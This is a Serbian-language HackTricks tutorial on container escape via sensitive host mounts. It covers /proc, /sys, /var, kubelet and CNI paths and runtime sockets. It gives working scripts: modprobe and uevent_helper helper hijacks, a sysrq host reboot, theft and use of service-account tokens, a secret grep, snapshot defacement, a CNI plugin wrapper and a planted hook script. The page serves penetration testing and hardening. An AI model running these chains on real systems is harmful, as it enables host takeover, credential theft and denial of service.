# Osetljiva montiranja hosta

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Montiranja hosta predstavljaju jednu od najvažnijih praktičnih površina za bekstvo iz kontejnera, jer često poništavaju pažljivo izolovan prikaz procesa i ponovo omogućavaju direktan uvid u resurse hosta. Opasni slučajevi ne ograničavaju se na `/`. Bind montiranja putanja `/proc`, `/sys`, `/var`, runtime socket-a, stanja kojim upravlja kubelet ili putanja povezanih sa uređajima mogu izložiti kontrole kernela, akreditive, sisteme datoteka susednih kontejnera i interfejse za upravljanje runtime-om.

Ova stranica postoji zasebno od pojedinačnih stranica o zaštiti zato što model zloupotrebe obuhvata više oblasti. Montiranje hosta sa dozvolom za pisanje opasno je delom zbog mount namespace-ova, delom zbog user namespace-ova, delom zbog pokrivenosti koju pružaju AppArmor ili SELinux, a delom zbog konkretne putanje hosta koja je izložena. Obrada ove teme zasebno znatno olakšava razumevanje površine napada.

Takođe uporedite direktorijum hosta u koji može da se upisuje sa odgovarajućom putanjom unutar svakog kontejnera. Ako je montiran preko direktorijuma izvršnih startup skripti, korisnik hosta sa nižim privilegijama može da postavi kod koji učitava entrypoint kontejnera sa višim privilegijama pri sledećem restartu. Potvrdite tačan izvor i odredište bind montiranja, dozvole za pisanje/pretragu direktorijuma, petlju entrypoint-a i uslov da datoteka bude izvršna, UID runtime-a i stvarni okidač za restart. UID 0 u kontejneru ne znači automatski i UID 0 na hostu; mapiranje user namespace-a i pravila montiranja određuju efekat na hostu. Pasivna provera treba da prijavi putanje i dozvole, bez upisivanja skripte ili restarta opterećenja.

Linux kontejner može da se nalazi unutar upravljačke VM koja deli deo sistema datoteka zasebnog Windows hosta. [Deljene fascikle VirtualBox-a](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) predstavljaju jedan od načina da datoteke hosta postanu vidljive u gostujućem sistemu, ali root u toj VM je i dalje zaseban identitet od Windows administratora. Ako deljeni direktorijum izlaže čitljiv privatni SSH ključ korisnika, tretirajte ga kao trag do akreditiva: proverite tačno montiranje zasnovano na hostu, vlasništvo nad ključem i pristup njemu, odgovarajući nalog i **efektivnu** politiku ovlašćenih ključeva Windows SSH servera pre nego što zaključite da omogućava prijavu na host. Savremeni [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) često koristi zasebnu datoteku `administrators_authorized_keys` za administratorske naloge. Sadržaj privatnog ključa ne uključujte u uobičajeni izlaz enumeracije; metapodaci o montiranju i putanji do ključa dovoljni su za pasivnu trijažu.

## Izloženost `/proc`

procfs sadrži i uobičajene informacije o procesima i interfejse za upravljanje kernelom sa ozbiljnim posledicama. Zato bind montiranje poput `-v /proc:/host/proc` ili prikaz kontejnera koji izlaže neočekivane upisive proc unose može dovesti do otkrivanja informacija, uskraćivanja usluge ili direktnog izvršavanja koda na hostu.

Važne procfs putanje obuhvataju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (posebno `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Najpre proverite koji su važni procfs unosi vidljivi ili upisivi:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe` i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada su upisive. `kallsyms`, `kmsg`, `kcore` i `config.gz` moćni su izvori za izviđanje pri iskorišćavanju kernela. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup-a i sistema datoteka, što može pomoći u rekonstrukciji rasporeda hosta iz kontejnera.

Praktična vrednost svake putanje je različita, a tretiranje svih kao da imaju isti uticaj otežava trijažu:

- `/proc/sys/kernel/core_pattern`
  Ako je upisiva, ovo je jedna od najuticajnijih procfs putanja jer će kernel izvršiti pipe handler nakon pada. Kontejner koji može da usmeri `core_pattern` na payload sačuvan u svom overlay-u ili na montiranoj putanji hosta često može da postigne izvršavanje koda na hostu. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
  Ova putanja kontroliše userspace pomoćni program koji kernel koristi kada treba da pozove logiku za učitavanje modula. Ako je upisiva iz kontejnera i tumači se u kontekstu hosta, može postati još jedan primitiv za izvršavanje koda na hostu. Posebno je zanimljiva u kombinaciji sa mogućnošću pokretanja pomoćne putanje.
- `/proc/sys/vm/panic_on_oom`
  Ovo obično nije čist primitiv za bekstvo, ali može da pretvori pritisak na memoriju u uskraćivanje usluge na nivou celog hosta tako što OOM uslove pretvara u ponašanje sa kernel panic-om.
- `/proc/sys/fs/binfmt_misc`
  Ako je interfejs za registraciju upisiv, napadač može registrovati handler za izabranu magičnu vrednost i dobiti izvršavanje u kontekstu hosta kada se izvrši odgovarajuća datoteka.
- `/proc/config.gz`
  Korisno za trijažu kernel exploita. Pomaže da se utvrdi koji su podsistemi, mere ublažavanja i opcione funkcije kernela omogućeni, bez potrebe za metapodacima paketa hosta.
- `/proc/sysrq-trigger`
  Uglavnom je putanja za uskraćivanje usluge, ali veoma ozbiljna. Može odmah da ponovo pokrene host, izazove panic ili ga na drugi način poremeti.
- `/proc/kmsg`
  Otkriva poruke iz kernel kružnog bafera. Korisno za identifikaciju hosta, analizu pada i, u nekim okruženjima, za leak informacija korisnih pri iskorišćavanju kernela.
- `/proc/kallsyms`
  Vredan je kada je čitljiv, jer izlaže informacije o izvezenim simbolima kernela i može pomoći u zaobilaženju pretpostavki o nasumičnom rasporedu adresa tokom razvoja kernel exploita.
- `/proc/[pid]/mem`
  Ovo je direktan interfejs za memoriju procesa. Ako je ciljni proces dostupan uz neophodne uslove nalik ptrace-u, može omogućiti čitanje ili izmenu memorije drugog procesa. Realni uticaj u velikoj meri zavisi od akreditiva, `hidepid`, Yama i ptrace ograničenja, pa je ovo moćna, ali uslovna putanja.
- `/proc/kcore`
  Izlaže prikaz sistemske memorije nalik core image-u. Datoteka je ogromna i nezgodna za korišćenje, ali ako je smisleno čitljiva, to ukazuje na ozbiljno izloženu površinu memorije hosta.
- `/dev/kmem` i `/dev/mem`
  Ovo su istorijski interfejsi za direktan pristup sirovoj memoriji sa velikim uticajem, i to **uređaji**, a ne procfs datoteke. Na mnogim savremenim sistemima ne postoje ili su strogo ograničeni, ali kontejner koji može da otvori hostovu montiranu kopiju treba da tretira izloženost kao kritičnu. Proverite ih zajedno sa drugim osetljivim montiranjima u `/dev`, umesto da tražite nepostojeće putanje `/proc/kmem` ili `/proc/mem`.
- `/proc/sched_debug`
  Otkriva informacije o raspoređivanju i zadacima koje mogu da otkriju identitete procesa hosta čak i kada drugi prikazi procesa deluju čistije nego što se očekuje.
- `/proc/[pid]/mountinfo`
  Izuzetno je korisno za rekonstrukciju mesta na hostu na kom se kontejner zaista nalazi, putanja koje koriste overlay i toga da li upisivo montiranje odgovara sadržaju hosta ili samo sloju kontejnera.

Ako su `/proc/[pid]/mountinfo` ili detalji overlay-a čitljivi, iskoristite ih da otkrijete putanju hosta do sistema datoteka kontejnera:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Ove komande su korisne jer je za brojne trikove za izvršavanje na hostu potrebno pretvoriti putanju unutar kontejnera u odgovarajuću putanju iz perspektive hosta.

### Primer: Priprema putanje pomoćnog programa `modprobe`

Ako je `/proc/sys/kernel/modprobe` moguće menjati iz kontejnera, a putanja pomoćnog programa tumači se u kontekstu hosta, može se preusmeriti na payload koji kontroliše napadač. Gornji direktorijum overlay sistema mora da se razreši na hostu, a dokaz izlaza mora da se upiše nazad u isti sloj kontejnera vidljiv sa hosta ako kontejner ne montira i host `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Tačan okidač zavisi od cilja i ponašanja kernela i namerno se ne nagađa. Vratite originalnu vrednost pre nego što napustite laboratoriju. Važno je da putanja helpera u koju može da se upisuje može da preusmeri buduće pozivanje kernel helpera na sadržaj host putanje kojim upravlja napadač. Nedostajući overlay `upperdir`, putanja koju host ne može da razreši, mount sysctl-a samo za čitanje ili kernel koji nikada ne poziva izabrani helper prekidaju ovaj lanac.

### Celovit primer: izviđanje kernela pomoću `kallsyms`, `kmsg` i `config.gz`

Ako je cilj procena mogućnosti eksploatacije, a ne neposredni escape:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Ove komande pomažu da se utvrdi da li su dostupne korisne informacije o simbolima, da li nedavne poruke kernela otkrivaju zanimljivo stanje i koje su funkcije ili mere zaštite kernela uključene pri kompajliranju. Uticaj obično nije direktan izlazak iz izolacije, ali može znatno da ubrza analizu ranjivosti kernela.

### Potpun primer: ponovno pokretanje hosta pomoću SysRq

Ako je moguće pisati u `/proc/sysrq-trigger` i putanja vodi do prikaza hosta:

```bash
echo b > /proc/sysrq-trigger
```

Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izloženost procfs-a može biti mnogo ozbiljnija od otkrivanja informacija.

## Izloženost `/sys`

sysfs izlaže velike količine stanja kernela i uređaja. Neke putanje u sysfs-u uglavnom su korisne za otkrivanje karakteristika sistema, dok druge mogu da utiču na izvršavanje pomoćnih programa, ponašanje uređaja, konfiguraciju bezbednosnih modula ili stanje firmvera.

Visokovredne putanje u sysfs-u uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može da utiče na ponašanje upravljanja temperaturom, a time i na stabilnost hosta u okruženjima sa loše podešenom izloženošću. `/sys/kernel/vmcoreinfo` može da otkrije informacije iz ispisa stanja nakon pada sistema i o rasporedu kernela, što pomaže pri detaljnom određivanju karakteristika hosta. `/sys/kernel/security` je interfejs `securityfs` koji koriste Linux Security Modules, pa neočekivan pristup može da otkrije ili izmeni stanje povezano sa MAC-om. Putanje EFI promenljivih mogu da utiču na podešavanja pokretanja sistema koja se čuvaju u firmveru, zbog čega su mnogo ozbiljnije od običnih konfiguracionih datoteka. `debugfs` u okviru `/sys/kernel/debug` posebno je opasan jer je namerno predviđen za programere i podrazumeva znatno manje bezbednosnih mera nego očvrsnuti kernel API-ji namenjeni produkcionim sistemima.

Svaki sysfs unos na ovom spisku zavisi od **kernela, konfiguracije i hardvera**. U aktuelnim virtuelizovanim okruženjima često uopšte nema čvorova `uevent_helper`, EFI promenljivih ni termalnih uređaja. Zabeležite nepostojeću putanju kao negativni preduslov, umesto da pretpostavite da se primer sa drugog kernela može primeniti.

Korisne komande za proveru ovih putanja su:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Šta ove komande čini zanimljivim:

- `/sys/kernel/security` može da otkrije da li su AppArmor, SELinux ili neka druga LSM površina vidljivi na način koji je trebalo da ostane dostupna samo hostu.
- `/sys/kernel/debug` je često najzabrinjavajući nalaz u ovoj grupi. Ako je `debugfs` montiran i može da se čita ili u njega upisuje, očekujte široku površinu izloženu kernelu, čiji tačan rizik zavisi od omogućenih debug čvorova.
- Izloženost EFI promenljivih je ređa, ali ima veliki uticaj ako postoji jer se odnosi na podešavanja podržana firmverom, a ne na obične datoteke tokom rada sistema.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za jednostavan escape kroz shell.
- `/sys/kernel/vmcoreinfo` je uglavnom izvor podataka za fingerprinting hosta i analizu pada sistema, koristan za razumevanje niskonivoičnog stanja kernela.

### Potpun primer: `uevent_helper`

`/sys/kernel/uevent_helper` zavisi od kernela i konfiguracije i ne postoji na mnogim aktuelnim sistemima. Ako postoji, može da se upisuje u njega i dostupan je upotrebljiv `uevent` okidač, kernel može da izvrši helper pod kontrolom napadača. Dokazni izlaz mora da koristi putanju vidljivu i iz host prikaza i iz prikaza kontejnera:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Razlog zbog kojeg ovo funkcioniše jeste to što se putanja pomoćnog programa tumači iz perspektive hosta. Kada se aktivira, pomoćni program se pokreće u kontekstu hosta, a ne unutar trenutnog kontejnera. `/sys/class/mem/null/uevent` je konkretan okidač na kernelima koji ga izlažu; drugi uređaji mogu izlagati sopstvene `uevent` datoteke, ali nemojte naslepo birati uređaj na stvarnom hardveru. Vratite prvobitnu vrednost pre nego što napustite lab. Nemojte navoditi da je ova tehnika dostupna ako nedostaju pomoćna datoteka ili kontrolisani okidač.

## Izloženost direktorijuma `/var`

Montiranje hostovog direktorijuma `/var` u kontejner često se potcenjuje jer ne deluje dramatično kao montiranje direktorijuma `/`. U praksi, to može biti dovoljno za pristup runtime soketima, direktorijumima sa snapshotovima kontejnera, kubelet-om upravljanim volumenima podova, projektovanim tokenima service accounta i susednim sistemima datoteka aplikacija. Na modernim nodovima, `/var` je često mesto na kom se zapravo nalazi najzanimljivije operativno stanje kontejnera.

### Primer za Kubernetes

Pod sa `hostPath: /var` često može da čita projektovane tokene drugih podova i sadržaj overlay snapshotova:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Ove komande su korisne jer pokazuju da li mount izlaže samo nebitne podatke aplikacije ili akreditive klastera visokog uticaja. Čitljiv token service account-a može odmah da pretvori lokalno izvršavanje koda u pristup Kubernetes API-ju.

Ako je token prisutan, proverite čemu može da pristupi, umesto da stanete na njegovom pronalaženju:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Uticaj ovde može biti mnogo veći od lokalnog pristupa čvoru. Token sa širokim RBAC ovlašćenjima može pretvoriti montirani `/var` u kompromitovanje celog klastera.

### Primer za Docker i containerd

Na Docker hostovima relevantni podaci se često nalaze u `/var/lib/docker`, dok se na Kubernetes čvorovima koji koriste containerd mogu nalaziti u `/var/lib/containerd` ili putanjama specifičnim za snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Ako montirani `/var` izlaže sadržaj snapshot-a drugog workload-a koji može da se menja, napadač može da izmeni fajlove aplikacije, postavi web sadržaj ili promeni skripte za pokretanje, a da ne dira konfiguraciju trenutnog kontejnera.

Na **privremenom laboratorijskom workload-u**, sadržaj snapshot-a koji može da se menja može da posluži za demonstraciju neovlašćenih izmena aplikacije, oporavka tajni ili lateralnog kretanja. Najpre mapirajte runtime container ID na tačan snapshot i nikada ne menjajte nepovezan ili produkcioni snapshot:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Ove komande su korisne jer prikazuju tri glavne grupe uticaja montiranog `/var`: neovlašćeno menjanje aplikacija, pribavljanje tajni i lateralno kretanje u susedna radna opterećenja.

Direktno upisivanje u snapshot zaobilazi uobičajeno upravljanje stanjem u runtime-u i može da ošteti kontejner ili uništi dokaze. Otkrivanje samo za čitanje lokalno je ponovljeno nad Docker `overlay2`: marker upisan u susednom privremenom kontejneru pojavio se u putanji `/var/lib/docker/overlay2/<id>/diff/`. Stvarne izmene snapshot-a ograničite na privremeni kontejner napravljen za taj test.

## Stanje Kubelet-a, dodaci i CNI putanje

Montiranja putanja `/var/lib/kubelet`, `/opt/cni/bin` ili `/etc/cni/net.d` često su izložena preko privilegovanih DaemonSet-ova, CNI agenata, CSI dodataka za čvorove, GPU operatora i pomoćnih alata za skladištenje. Lako ih je odbaciti kao „infrastrukturu чвора“, ali se nalaze direktno na putanji izvršavanja novih podova i često sadrže kubelet kredencijale, projektovane tajne, sokete za registraciju i izvršne binarne datoteke dodataka na hostu.

Ciljevi visoke vrednosti uključuju:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za pregled su:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Zašto su ove putanje važne:

- `/var/lib/kubelet/pki` može da izloži klijentske sertifikate kubelet-a i druge akreditive lokalne za čvor, koji se ponekad mogu ponovo upotrebiti za pristup API serveru ili TLS krajnjim tačkama koje koristi kubelet, u zavisnosti od dizajna klastera.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` često sadrži projektovane tokene service account-a i montirane Secrets za susedne podove na istom čvoru.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je prvenstveno površina za izviđanje, ali veoma korisna: otkriva koji podovi i kontejneri trenutno koriste GPU-ove, hugepages, SR-IOV uređaje i druge oskudne resurse lokalne za čvor.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` otkrivaju koji su CSI, DRA i device plugin-ovi instalirani i sa kojim socket-ima kubelet treba da komunicira. Ako su ti direktorijumi upisivi, a ne samo čitljivi, nalaz postaje mnogo ozbiljniji.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` i `/etc/cni/net.d` nalaze se direktno na putanji za podešavanje pod mreže. Upisiv pristup tim putanjama često predstavlja odloženi mehanizam za izvršavanje na hostu, a ne samo izlaganje konfiguracije.<sup>[[2]](#references)</sup>

### Potpun primer: Upisiv `/opt/cni/bin`

Ako je direktorijum host CNI binarnih datoteka montiran sa dozvolom za čitanje i upisivanje, zamena plugin-a može biti dovoljna za dobijanje mogućnosti izvršavanja koda na hostu sledeći put kada kubelet kreira pod sandbox na tom čvoru:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Ovo nije tako neposredno kao montirani `docker.sock`, ali je često realističnije u kompromitovanim Kubernetes infrastrukturnim podovima. Marker se upisuje pored montiranog dodatka, tako da kontejner može da ga preuzme čak i bez montiranja host-root direktorijuma ili host-`/tmp` direktorijuma. Wrapper čuva originalne argumente i standardni ulaz, a zatim primer vraća originalni binarni fajl. Važno je to što izmenjeni binarni fajl kasnije izvršava hostov tok podešavanja mreže, a ne trenutni kontejner. Koristite samo čvor namenjen za jednokratnu upotrebu, jer neispravan wrapper može da spreči da novim Pod sandbox okruženjima bude omogućeno umrežavanje.

## Runtime soketi

Osetljiva montiranja hosta često obuhvataju runtime sokete, a ne čitave direktorijume. Toliko su važni da zaslužuju da ih ovde izričito ponovimo:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije nakon što se jedan od ovih socket-a montira.

Kao brz obrazac za prvu interakciju:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Ako jedno od ovih uspe, put od „montiranog socketa“ do „pokretanja privilegovanijeg sibling containera“ obično je mnogo kraći od bilo kog puta za izlazak iz kernela.

Isti pristup daemonu može da omogući i **perzistenciju na hostu**. Helper container sa upisivim bind mountom do korena hosta može da primi fajlove pomoću `docker cp`, a zatim pomoću `docker exec` postavi SSH ključ, service unit ili drugu datoteku za perzistenciju u montiranu putanju hosta. Bezbednosna granica je ovlašćenje da daemon kreira mount na hostu; `docker cp` je samo korak za pripremu. Nakon izlaganja runtime socketa, proveravajte i novokreirane containere i upise u putanje za autentifikaciju ili pokretanje na hostu.

## Otmica zadatka preko upisive putanje na hostu

Upisivi mount na hostu ne mora da izlaže `/` da bi bio opasan. Ako montirana putanja sadrži skripte, konfiguracione fajlove, hooks, plugins ili fajlove koje kasnije koristi zakazani zadatak ili servis na hostu, container može da promeni ono što host izvršava.

Opšti tok provere:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Ako host proces koristi datoteku u koju je moguće upisivati, neka payload tokom testiranja bude jednostavan i lako uočljiv:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Zanimljiv deo je granica poverenja: upis se obavlja iz kontejnera, ali se izvršavanje dešava kasnije, u kontekstu host servisa. Time se uski hostPath ili bind mount pretvara u primitiv za odloženo izvršavanje koda na hostu.

## Datoteke u vlasništvu root-a na zajedničkoj host putanji

Nalog u kontejneru koji može da postane root možda može da postavi datoteku u vlasništvu root-a na putanju sa dozvolom za upis koju koristi i host. Ako se UID 0 u kontejneru mapira na UID 0 na hostu, oba prikaza odnose se na istu datoteku, a host mount dozvoljava SUID izvršavanje, host korisnik koji može da pokrene root-owned SUID izvršnu datoteku na toj putanji možda može da pređe granicu privilegija hosta. Za ovaj konkretan problem sa vlasništvom datoteke, kontejner ne mora da se pokreće sa `--privileged`. Pogledajte [mapiranja user namespace-a](protections/namespaces/user-namespace.md) i [diskusiju o SUID-u](privileged-containers.md) za odvojene uslove.

Pregledajte putanju **sa obe strane**: uporedite vlasništvo i identitet bezazlene datoteke, proverite `uid_map` i `gid_map` kontejnera i pregledajte opcije mount-a i pravila izvršavanja na hostu. `rw` sa strane kontejnera, bez `nosuid`, samo ukazuje na mogući slučaj; time se ne utvrđuju vlasništvo na hostu, zastavice mount-a na hostu, pristup host korisnika niti to da li AppArmor/SELinux blokira izvršavanje. `noexec` ograničava izvršavanje u prikazu na koji se primenjuje. Oznake `shared:` i `master:` u `/proc/self/mountinfo` opisuju propagaciju mount-a, a ne to da li se sadržaj datoteke deli sa hostom. Bind mount možda nema te oznake. Ponovna upotreba akreditiva koja omogućava prijavu na host odvojen je korak od granice privilegija zasnovane na zajedničkoj datoteci.

Skladište runtime-a na hostu može da stvori sličnu putanju čak i bez eksplicitnog bind mount-a. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) omogućio je neprivilegovanom korisniku hosta da prolazi kroz poddirektorijume Docker podataka i izvršava datoteke iz sistema datoteka kontejnera; Moby je ispravio dozvole u verziji 20.10.9 i napominje da pokrenuti kontejneri moraju da se restartuju kako bi se ispravili njihovi direktorijumi. Pregledajte tačne putanje mount-a `overlay2/<id>/merged` i dozvolu pretrage svakog nadređenog direktorijuma, pa utvrdite da li se UID 0 kontejnera mapira na UID 0 hosta, da li postoji dostupna root-owned SetUID izvršna datoteka i da li prikaz na hostu dozvoljava SetUID izvršavanje. Rootless kontejneri ili kontejneri sa remapiranjem user namespace-a, `nosuid`, `noexec`, `no_new_privs` i MAC pravila mogu da promene ishod. Verzija runtime-a ili putanja kroz koju se može prolaziti samo su smernice za pregled, a ne dokaz izvršavanja sa host-root privilegijama; pregledajte metapodatke mount-a i datoteke bez pokretanja potencijalno opasne izvršne datoteke.

## CVE-ovi povezani sa mount-ovima

Host mount-ovi se prepliću i sa ranjivostima runtime-a. Među važnim novijim primerima su:

- `CVE-2024-21626` u `runc`, gde je procureli deskriptor datoteke direktorijuma mogao da postavi radni direktorijum na sistem datoteka hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` u BuildKit-u, gde su zlonamerni Dockerfile-ovi, frontend-i i tokovi `RUN --mount` mogli ponovo da omoguće pristup datotekama hosta, brisanje ili povišene privilegije tokom izgradnje.
- `CVE-2024-1753` u Buildah i Podman tokovima izgradnje, gde su posebno napravljeni bind mount-ovi tokom izgradnje mogli da izlože `/` sa dozvolama za čitanje i upis.
- `CVE-2025-47290` u `containerd` 2.1.0, gde je TOCTOU tokom raspakivanja slike mogao da omogući posebno napravljenoj slici da izmeni sistem datoteka hosta tokom preuzimanja.

Ovi CVE-ovi su ovde važni jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatora. I sam runtime može da uvede uslove za bekstvo iz kontejnera izazvane mount-ovima.

## Provere

Koristite ove komande da brzo pronađete izloženosti mount-ova sa najvećim potencijalnim uticajem:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Šta je ovde zanimljivo:

- Host root, `/proc`, `/sys`, `/var` i runtime soketi predstavljaju nalaze visokog prioriteta.
- Upisivi unosi u proc/sys često znače da mount izlaže globalne kontrole kernela na hostu, a ne bezbedan prikaz kontejnera.
- Putanje montiranog `/var` zahtevaju proveru kredencijala i susednih workload-ova, a ne samo pregled fajl sistema.
- Direktorijumi sa stanjem kubelet-a i putanje za CNI/dodatke zaslužuju isti prioritet kao runtime soketi, jer se često nalaze direktno na putanji za kreiranje pod-ova na čvoru i distribuciju kredencijala.

## Lokalni status validacije

Praktični lanci na ovoj stranici provereni su na lokalnom Linux minikube čvoru. Validacijom su potvrđeni:

- pristup za čitanje i upis preko privremenog upisivog hostPath-a
- otkrivanje projektovanih ServiceAccount tokena i montiranih tajni preko `/var/lib/kubelet/pods`
- uspešna autentifikacija na Kubernetes API-ju pomoću važećeg tokena preuzetog iz tog montiranog kubelet stanja
